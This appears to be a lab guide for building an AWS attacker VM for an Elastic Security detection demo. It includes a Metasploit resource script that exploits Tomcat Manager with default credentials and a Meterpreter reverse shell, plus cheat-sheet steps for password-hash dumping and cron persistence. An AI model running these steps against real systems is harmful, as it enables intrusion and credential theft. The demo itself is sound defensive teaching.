# Elastic Security Demo - Attacker VM Setup Guide

## Overview

This guide will help you set up a fresh Ubuntu VM on AWS as your attacker machine for the Elastic Security demonstration. You'll install only the essential tools needed for the demo.

**Estimated Setup Time:** 30-45 minutes  
**Target OS:** Ubuntu 22.04 or 24.04 LTS  
**Required Disk Space:** 20GB

---

## Table of Contents

1. [AWS VM Provisioning](#aws-vm-provisioning)
2. [Initial System Setup](#initial-system-setup)
3. [Install Required Applications](#install-required-applications)
4. [Configure Detection-Rules](#configure-detection-rules)
5. [Configure Metasploit](#configure-metasploit)
6. [Create Demo Scripts](#create-demo-scripts)
7. [Verification and Testing](#verification-and-testing)
8. [Troubleshooting](#troubleshooting)

---

## AWS VM Provisioning

### Step 1: Launch EC2 Instance

**Instance Configuration:**

```
AMI: Ubuntu Server 24.04 LTS (HVM), SSD Volume Type
Instance Type: t3.medium (2 vCPU, 4 GB RAM)
Storage: 20 GB gp3 EBS volume
```

**Launch Steps:**

1. Go to AWS Console → EC2 → Launch Instance
2. Name: `elastic-demo-attacker`
3. Select "Ubuntu" → "Ubuntu Server 24.04 LTS"
4. Instance type: `t3.medium`
5. Key pair: Create new or select existing
6. Network settings: See security group configuration below
7. Storage: 20 GB gp3
8. Click "Launch instance"

### Step 2: Configure Security Groups

**Create Security Group: `elastic-demo-attacker-sg`**

**Inbound Rules:**

```
Type          Protocol  Port Range  Source          Description
SSH           TCP       22          Your IP/32      Management access
Custom TCP    TCP       4444        Target VM SG    Metasploit listener
Custom TCP    TCP       4445        Target VM SG    Persistence callback
```

**Outbound Rules:**

```
Type          Protocol  Port Range  Destination     Description
HTTP          TCP       8080        Target VM SG    Tomcat access
HTTPS         TCP       443         0.0.0.0/0       Elastic Cloud API
SSH           TCP       22          0.0.0.0/0       Git access
Custom TCP    TCP       4444        0.0.0.0/0       Reverse shell
Custom TCP    TCP       4445        0.0.0.0/0       Persistence
All ICMP      ICMP      All         Target VM SG    Ping testing
```

### Step 3: Connect to Instance

```bash
# Get public IP from AWS Console
export ATTACKER_IP=YOUR_PUBLIC_IP

# Connect via SSH
ssh -i /path/to/your-key.pem ubuntu@$ATTACKER_IP

# Update hostname (optional)
sudo hostnamectl set-hostname elastic-attacker
```

---

## Initial System Setup

### Update System

```bash
# Update package lists
sudo apt update

# Upgrade installed packages
sudo apt upgrade -y

# Install basic utilities
sudo apt install -y \
  software-properties-common \
  apt-transport-https \
  ca-certificates \
  gnupg \
  lsb-release
```

### Set Timezone (Optional)

```bash
# Set to your timezone
sudo timedatectl set-timezone Europe/Stockholm

# Verify
timedatectl
```

---

## Install Required Applications

### Method 1: Automated Installation (Recommended)

Create and run the installation script:

```bash
# Create installation script
cat > ~/setup_attacker.sh << 'SCRIPT_EOF'
#!/bin/bash

echo "=========================================="
echo "Elastic Security Demo - Attacker VM Setup"
echo "=========================================="
echo ""

# Function to check command success
check_success() {
    if [ $? -eq 0 ]; then
        echo "✅ $1"
    else
        echo "❌ $1 - FAILED"
        exit 1
    fi
}

# Update system
echo "[1/6] Updating system..."
sudo apt update && sudo apt upgrade -y
check_success "System updated"
echo ""

# Install basic tools
echo "[2/6] Installing basic tools..."
sudo apt install -y \
  python3 \
  python3-pip \
  python3-venv \
  git \
  nmap \
  netcat-openbsd \
  curl \
  wget \
  net-tools \
  vim \
  tmux \
  postgresql \
  postgresql-contrib
check_success "Basic tools installed"
echo ""

# Install Java (for manual WAR creation - optional)
echo "[3/6] Installing Java..."
sudo apt install -y openjdk-11-jdk
check_success "Java installed"
echo ""

# Install Metasploit Framework
echo "[4/6] Installing Metasploit Framework..."
echo "This may take 5-10 minutes..."
curl -s https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
chmod 755 /tmp/msfinstall
sudo /tmp/msfinstall
check_success "Metasploit Framework installed"
rm /tmp/msfinstall
echo ""

# Initialize Metasploit database
echo "[5/6] Initializing Metasploit database..."
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
check_success "Metasploit database initialized"
echo ""

# Clone detection-rules repository
echo "[6/6] Setting up detection-rules..."
cd ~
if [ -d "detection-rules" ]; then
    echo "Detection-rules directory exists, pulling latest..."
    cd detection-rules
    git pull
else
    git clone https://github.com/elastic/detection-rules.git
    cd detection-rules
fi
check_success "Detection-rules cloned"

# Set up Python virtual environment
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
deactivate
check_success "Python virtual environment configured"
echo ""

# Print versions
echo "=========================================="
echo "Installation Complete!"
echo "=========================================="
echo ""
echo "Installed versions:"
msfconsole --version
python3 --version
nmap --version | head -1
git --version
java -version 2>&1 | head -1
echo ""
echo "Metasploit Database Status:"
sudo msfdb status
echo ""
echo "Detection-rules location: ~/detection-rules"
echo ""
echo "=========================================="
echo "Next Steps:"
echo "1. Configure detection-rules (see guide)"
echo "2. Create Metasploit resource script"
echo "3. Test connectivity to target VM"
echo "=========================================="
SCRIPT_EOF

# Make executable and run
chmod +x ~/setup_attacker.sh
~/setup_attacker.sh
```

**Installation Time:** 15-20 minutes (Metasploit download is the longest part)

### Method 2: Manual Installation

If you prefer to install step-by-step:

#### Install Basic Tools

```bash
sudo apt install -y \
  python3 \
  python3-pip \
  python3-venv \
  git \
  nmap \
  netcat-openbsd \
  curl \
  wget \
  net-tools \
  vim \
  tmux
```

#### Install PostgreSQL (for Metasploit)

```bash
sudo apt install -y postgresql postgresql-contrib
sudo systemctl start postgresql
sudo systemctl enable postgresql
```

#### Install Java

```bash
sudo apt install -y openjdk-11-jdk

# Verify installation
java -version
jar
```

#### Install Metasploit Framework

```bash
# Download installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

# Make executable
chmod 755 msfinstall

# Install (requires sudo, will take 5-10 minutes)
sudo ./msfinstall

# Clean up
rm msfinstall

# Verify installation
msfconsole --version
```

#### Initialize Metasploit Database

```bash
# Initialize database
sudo msfdb init

# Check status
sudo msfdb status

# Should show: "Database started at /var/lib/postgresql/..."
```

#### Clone Detection-Rules Repository

```bash
# Clone repository
cd ~
git clone https://github.com/elastic/detection-rules.git
cd detection-rules

# Set up Python virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install --upgrade pip
pip install -r requirements.txt

# Verify installation
python -m detection_rules --help

# Deactivate venv for now
deactivate
```

---

## Configure Detection-Rules

### Step 1: Activate Virtual Environment

```bash
cd ~/detection-rules
source .venv/bin/activate
```

### Step 2: Configure Elastic Connection

You'll need your Elastic Cloud credentials. Get these from your Elastic Cloud console:

- Cloud ID
- Kibana URL
- Username (typically `elastic`)
- Password

**Configure the connection:**

```bash
# Interactive configuration
kibana create-rule-config \
  --kibana-url https://YOUR-DEPLOYMENT.es.us-central1.gcp.cloud.es.io:9243 \
  --cloud-id "YOUR-CLOUD-ID-HERE" \
  --kibana-user elastic

# You'll be prompted for password
# Enter your Elastic password when prompted
```

**Alternative: Manual configuration**

Create config file manually:

```bash
mkdir -p ~/.detection-rules-cfg

cat > ~/.detection-rules-cfg/.drift-config << 'EOF'
kibana_url: https://YOUR-DEPLOYMENT.es.us-central1.gcp.cloud.es.io:9243
cloud_id: YOUR-CLOUD-ID-HERE
kibana_user: elastic
kibana_password: YOUR-PASSWORD-HERE
EOF

# Secure the config file
chmod 600 ~/.detection-rules-cfg/.drift-config
```

### Step 3: Test Connection

```bash
# Test by listing existing rules
python -m detection_rules kibana export-rules --help

# If configured correctly, you should see help output with no errors
```

### Step 4: Create Custom Rule Directory

```bash
# Create directory for your custom rules
mkdir -p ~/detection-rules/rules/custom

# This is where you'll create the Tomcat detection rule during the demo
```

---

## Configure Metasploit

### Step 1: First-Time Setup

```bash
# Start Metasploit console for first-time initialization
msfconsole

# Inside msfconsole, check database connection:
msf6 > db_status
# Should show: "postgresql connected to msf"

# Create workspace for your demo
msf6 > workspace -a elastic_demo
msf6 > workspace elastic_demo

# Exit
msf6 > exit
```

### Step 2: Test Metasploit

```bash
# Quick test to ensure Metasploit works
msfconsole -q -x "version; exit"

# Should display Metasploit version and exit
```

---

## Create Demo Scripts

### Step 1: Create Metasploit Resource Script

This script pre-configures your exploit for faster demo execution:

```bash
cat > ~/elastic_demo.rc << 'EOF'
# Elastic Security Demo - Metasploit Resource Script
# This pre-configures the Tomcat Manager exploit

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET_VM_PRIVATE_IP
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST ATTACKER_VM_PRIVATE_IP
set payload java/meterpreter/reverse_tcp
set LPORT 4444
EOF

echo "✅ Metasploit resource script created: ~/elastic_demo.rc"
echo ""
echo "⚠️  IMPORTANT: Edit this file and replace:"
echo "   - TARGET_VM_PRIVATE_IP with your target's private IP"
echo "   - ATTACKER_VM_PRIVATE_IP with this VM's private IP"
echo ""
```

### Step 2: Update Resource Script with Your IPs

Get your private IP:

```bash
# Get this VM's private IP
hostname -I | awk '{print $1}'
```

Edit the resource script:

```bash
# Edit the file
nano ~/elastic_demo.rc

# Replace placeholders:
# TARGET_VM_PRIVATE_IP -> 10.0.1.50 (example)
# ATTACKER_VM_PRIVATE_IP -> 10.0.1.100 (example)

# Save and exit (Ctrl+X, Y, Enter)
```

### Step 3: Create Test Script

Create a connectivity test script:

```bash
cat > ~/test_connectivity.sh << 'SCRIPT_EOF'
#!/bin/bash

echo "=========================================="
echo "Connectivity Test - Elastic Demo"
echo "=========================================="
echo ""

# Check if TARGET_IP is set
if [ -z "$1" ]; then
    echo "Usage: ./test_connectivity.sh TARGET_IP"
    exit 1
fi

TARGET_IP=$1

echo "Testing connectivity to target: $TARGET_IP"
echo ""

# Test 1: ICMP ping
echo "Test 1: ICMP Ping"
if ping -c 3 $TARGET_IP > /dev/null 2>&1; then
    echo "✅ ICMP ping successful"
else
    echo "❌ ICMP ping failed"
fi
echo ""

# Test 2: Tomcat port (8080)
echo "Test 2: Tomcat Port (8080)"
if nc -zv $TARGET_IP 8080 2>&1 | grep -q succeeded; then
    echo "✅ Port 8080 is open"
else
    echo "❌ Port 8080 is closed or filtered"
fi
echo ""

# Test 3: HTTP GET request to Tomcat
echo "Test 3: HTTP GET to Tomcat"
if curl -s --connect-timeout 5 http://$TARGET_IP:8080 | grep -q Tomcat; then
    echo "✅ Tomcat is responding"
else
    echo "⚠️  Tomcat may not be running or accessible"
fi
echo ""

# Test 4: Tomcat Manager authentication
echo "Test 4: Tomcat Manager Access"
RESPONSE=$(curl -s -u tomcat:tomcat http://$TARGET_IP:8080/manager/text/list)
if echo "$RESPONSE" | grep -q "OK"; then
    echo "✅ Tomcat Manager accessible with tomcat/tomcat"
    echo "   Found applications:"
    echo "$RESPONSE" | grep "^/"
else
    echo "⚠️  Tomcat Manager not accessible or wrong credentials"
fi
echo ""

echo "=========================================="
echo "Test Complete"
echo "=========================================="
SCRIPT_EOF

chmod +x ~/test_connectivity.sh

echo "✅ Connectivity test script created: ~/test_connectivity.sh"
echo ""
echo "Usage: ./test_connectivity.sh TARGET_IP"
```

### Step 4: Create Demo Cheat Sheet

Create a quick reference for demo day:

```bash
cat > ~/demo_cheatsheet.md << 'EOF'
# Elastic Security Demo - Cheat Sheet

## Pre-Demo Checklist

- [ ] VMs are running
- [ ] Connectivity tested
- [ ] Resource script updated with correct IPs
- [ ] Elastic Cloud accessible
- [ ] Detection-rules configured

## Terminal Setup

```bash
# Terminal 1: Detection Rules
cd ~/detection-rules
source .venv/bin/activate

# Terminal 2: Metasploit
msfconsole -r ~/elastic_demo.rc

# Terminal 3: Backup/monitoring
watch -n 5 'curl -s http://TARGET_IP:8080'
```

## Quick Commands

### Detection Engineering

```bash
# Show rule
cat rules/linux/execution_suspicious_java_child_process.toml

# Create custom rule
nano rules/custom/tomcat_webshell_detection.toml

# Test rule
python -m detection_rules test rules/custom/tomcat_webshell_detection.toml

# Deploy rule
python -m detection_rules kibana upload-rule rules/custom/tomcat_webshell_detection.toml
```

### Metasploit Attack

```bash
# Start (resource script loads automatically)
msfconsole -r ~/elastic_demo.rc

# Execute
exploit

# Commands
sysinfo
getuid
shell
whoami
uname -a
exit
background

# Post-exploitation
use post/linux/gather/hashdump
set SESSION 1
run

# Persistence
use exploit/linux/local/persistence_cron
set SESSION 1
run
```

### Recovery Commands

```bash
# If session dies
sessions -l
sessions -i 1

# Re-exploit
use exploit/multi/http/tomcat_mgr_upload
exploit

# Check database
db_status
workspace elastic_demo
```

## IPs for Demo

```
Attacker: _______________
Target:   _______________
Elastic:  https://_______________
```

## Backup Plan

If Metasploit fails:

1. Show pre-recorded screenshots
2. Walk through manual commands
3. Focus on detection-rules and cases

If detection-rules fails:

1. Show rules in Elastic UI only
2. Reference GitHub repo
3. Explain workflow conceptually
EOF

echo "✅ Demo cheat sheet created: ~/demo_cheatsheet.md"
```

---

## Verification and Testing

### Run Verification Script

```bash
cat > ~/verify_setup.sh << 'SCRIPT_EOF'
#!/bin/bash

echo "=========================================="
echo "Attacker VM Setup Verification"
echo "=========================================="
echo ""

# Function to check command
check_command() {
    if command -v $1 &> /dev/null; then
        echo "✅ $2: $(command -v $1)"
        if [ ! -z "$3" ]; then
            $3
        fi
    else
        echo "❌ $2: NOT FOUND"
    fi
}

# Check basic tools
echo "=== Basic Tools ==="
check_command python3 "Python" "python3 --version"
check_command pip3 "pip" "pip3 --version"
check_command git "Git" "git --version"
check_command nmap "Nmap" "nmap --version | head -1"
check_command nc "Netcat"
check_command curl "curl"
check_command wget "wget"
check_command java "Java" "java -version 2>&1 | head -1"
echo ""

# Check Metasploit
echo "=== Metasploit Framework ==="
if command -v msfconsole &> /dev/null; then
    echo "✅ Metasploit installed"
    msfconsole --version
    
    # Check database
    DB_STATUS=$(sudo msfdb status 2>&1)
    if echo "$DB_STATUS" | grep -q "started"; then
        echo "✅ Database: Running"
    else
        echo "⚠️  Database: Not running (run: sudo msfdb init)"
    fi
else
    echo "❌ Metasploit: NOT INSTALLED"
fi
echo ""

# Check detection-rules
echo "=== Detection Rules ==="
if [ -d ~/detection-rules ]; then
    echo "✅ Repository: ~/detection-rules"
    
    if [ -f ~/detection-rules/.venv/bin/activate ]; then
        echo "✅ Virtual environment: Configured"
        
        # Test Python packages
        source ~/detection-rules/.venv/bin/activate
        if python -m detection_rules --help &> /dev/null; then
            echo "✅ detection-rules package: Working"
        else
            echo "⚠️  detection-rules package: Not working correctly"
        fi
        deactivate
    else
        echo "❌ Virtual environment: NOT CONFIGURED"
    fi
else
    echo "❌ Repository: NOT CLONED"
fi
echo ""

# Check demo files
echo "=== Demo Files ==="
if [ -f ~/elastic_demo.rc ]; then
    echo "✅ Metasploit resource script: ~/elastic_demo.rc"
else
    echo "⚠️  Metasploit resource script: NOT CREATED"
fi

if [ -f ~/test_connectivity.sh ]; then
    echo "✅ Connectivity test script: ~/test_connectivity.sh"
else
    echo "⚠️  Connectivity test script: NOT CREATED"
fi
echo ""

# Network info
echo "=== Network Information ==="
echo "Private IP: $(hostname -I | awk '{print $1}')"
echo "Public IP: $(curl -s ifconfig.me 2>/dev/null || echo 'Unable to determine')"
echo ""

echo "=========================================="
echo "Verification Complete"
echo "=========================================="
echo ""
echo "If any items are marked with ❌, review the"
echo "installation steps for those components."
SCRIPT_EOF

chmod +x ~/verify_setup.sh
~/verify_setup.sh
```

### Test Metasploit

```bash
# Quick Metasploit test
msfconsole -q -x "version; db_status; workspace -l; exit"

# Expected output:
# - Metasploit version
# - Database status: connected
# - Workspace list including 'elastic_demo'
```

### Test Detection-Rules

```bash
cd ~/detection-rules
source .venv/bin/activate

# Test basic functionality
python -m detection_rules --help

# Search for rules
python -m detection_rules search "tomcat"

# Should show some results
deactivate
```

### Test Connectivity to Target

Once your target VM is running:

```bash
# Run connectivity test
./test_connectivity.sh TARGET_VM_IP

# Manual tests
ping TARGET_VM_IP
nmap -p 8080 TARGET_VM_IP
curl http://TARGET_VM_IP:8080
```

---

## Troubleshooting

### Issue: Metasploit Database Won't Initialize

**Symptoms:**
```
msfdb init
# Error: database initialization failed
```

**Solution:**

```bash
# Stop PostgreSQL
sudo systemctl stop postgresql

# Remove old database
sudo rm -rf /var/lib/postgresql/

# Reinstall PostgreSQL
sudo apt remove --purge postgresql postgresql-contrib
sudo apt autoremove
sudo apt install -y postgresql postgresql-contrib

# Restart and initialize
sudo systemctl start postgresql
sudo msfdb init
```

### Issue: Python Virtual Environment Won't Activate

**Symptoms:**
```
source .venv/bin/activate
# Error: No such file or directory
```

**Solution:**

```bash
cd ~/detection-rules

# Remove old venv
rm -rf .venv

# Recreate
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

### Issue: Detection-Rules Can't Connect to Elastic

**Symptoms:**
```
python -m detection_rules kibana export-rules
# Error: Connection refused or authentication failed
```

**Solution:**

```bash
# Verify Elastic Cloud is accessible
curl -u elastic:YOUR_PASSWORD https://YOUR_DEPLOYMENT.es.region.cloud.es.io:9243

# Reconfigure
kibana create-rule-config \
  --kibana-url https://YOUR_DEPLOYMENT.es.region.cloud.es.io:9243 \
  --cloud-id "YOUR_CLOUD_ID"

# Test connection
python -m detection_rules kibana export-rules --help
```

### Issue: Can't Connect to Target VM

**Symptoms:**
```
ping TARGET_IP
# Request timeout
```

**Solutions:**

1. **Check Security Groups:**
   - Verify attacker VM can reach target VM
   - Check target VM security group allows traffic from attacker

2. **Verify Both VMs Are Running:**
   ```bash
   # In AWS Console, check instance state
   ```

3. **Check Target VM Tomcat:**
   ```bash
   # SSH to target
   ssh ubuntu@TARGET_IP
   
   # Check Tomcat status
   sudo systemctl status tomcat
   
   # Check if listening
   sudo netstat -tlnp | grep 8080
   ```

4. **Use VPC Peering or Same Subnet:**
   - Ensure both VMs are in same VPC
   - Or configure VPC peering if in different VPCs

### Issue: Metasploit Exploit Fails

**Symptoms:**
```
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
# Error: Connection refused or authentication failed
```

**Solutions:**

1. **Verify Credentials:**
   ```bash
   # Test manually
   curl -u tomcat:tomcat http://TARGET_IP:8080/manager/text/list
   ```

2. **Check RHOSTS and LHOST:**
   ```bash
   # In msfconsole
   show options
   # Verify IPs are correct (use PRIVATE IPs, not public)
   ```

3. **Test Basic Connectivity:**
   ```bash
   # From attacker VM
   curl http://TARGET_IP:8080
   ```

---

## Post-Setup Configuration

### Save AWS Credentials (if needed for automation)

If you plan to script interactions with AWS:

```bash
# Install AWS CLI
sudo apt install -y awscli

# Configure
aws configure
# Enter your AWS credentials
```

### Configure SSH Keys for Easy Access

```bash
# On your local machine
ssh-keygen -t rsa -b 4096 -f ~/.ssh/elastic-demo-key

# Copy to attacker VM
ssh-copy-id -i ~/.ssh/elastic-demo-key ubuntu@ATTACKER_PUBLIC_IP

# Create SSH config entry
cat >> ~/.ssh/config << 'EOF'
Host elastic-attacker
    HostName ATTACKER_PUBLIC_IP
    User ubuntu
    IdentityFile ~/.ssh/elastic-demo-key
    ServerAliveInterval 60
EOF

# Now you can connect with:
ssh elastic-attacker
```

### Create Snapshot (Recommended)

After everything is configured and tested:

1. Go to AWS Console → EC2 → Instances
2. Select your attacker VM
3. Actions → Image and templates → Create image
4. Name: `elastic-demo-attacker-configured`
5. Click "Create image"

**Benefit:** If something breaks, you can restore from this snapshot

---

## Quick Reference

### Important Files and Directories

```
~/detection-rules/           # Detection rules repository
~/detection-rules/.venv/     # Python virtual environment
~/elastic_demo.rc            # Metasploit resource script
~/test_connectivity.sh       # Connectivity test script
~/verify_setup.sh           # Setup verification script
~/demo_cheatsheet.md        # Demo day reference
~/.detection-rules-cfg/     # Elastic configuration
```

### Important Commands

```bash
# Activate detection-rules environment
cd ~/detection-rules && source .venv/bin/activate

# Start Metasploit with demo config
msfconsole -r ~/elastic_demo.rc

# Test target connectivity
./test_connectivity.sh TARGET_IP

# Verify setup
./verify_setup.sh

# Check Metasploit database
sudo msfdb status
```

### AWS Instance Management

```bash
# Stop instance (from AWS CLI)
aws ec2 stop-instances --instance-ids i-1234567890abcdef0

# Start instance
aws ec2 start-instances --instance-ids i-1234567890abcdef0

# Get instance IP
aws ec2 describe-instances \
  --instance-ids i-1234567890abcdef0 \
  --query 'Reservations[0].Instances[0].PublicIpAddress'
```

---

## Pre-Demo Checklist

Print this and keep it handy:

```
□ Attacker VM is running
□ Target VM is running
□ Both VMs have correct security groups
□ Connectivity test passes
□ Metasploit resource script has correct IPs
□ Detection-rules is configured for Elastic
□ Terminal windows are organized
□ Elastic Security UI is open in browser
□ Demo cheat sheet is visible
□ Phone is silenced
□ Extra terminal ready for troubleshooting
```

---

## Next Steps

After completing this setup:

1. **Configure Target VM** - Follow the Tomcat installation guide
2. **Test Complete Flow** - Run through attack chain once
3. **Practice Demo** - Follow the 2-day practice plan
4. **Take Snapshot** - Create AWS AMI of configured state
5. **Wednesday** - Execute demo with confidence!

---

## Support and Resources

- **Metasploit Documentation:** https://docs.metasploit.com/
- **Detection-Rules GitHub:** https://github.com/elastic/detection-rules
- **Elastic Security Docs:** https://www.elastic.co/guide/en/security/current/
- **Your Demo Guide:** `elastic_security_complete_demo_v2.md`

---

**Document Version:** 1.0  
**Last Updated:** November 2025  
**Created For:** Elastic Security Demo - Wednesday Presentation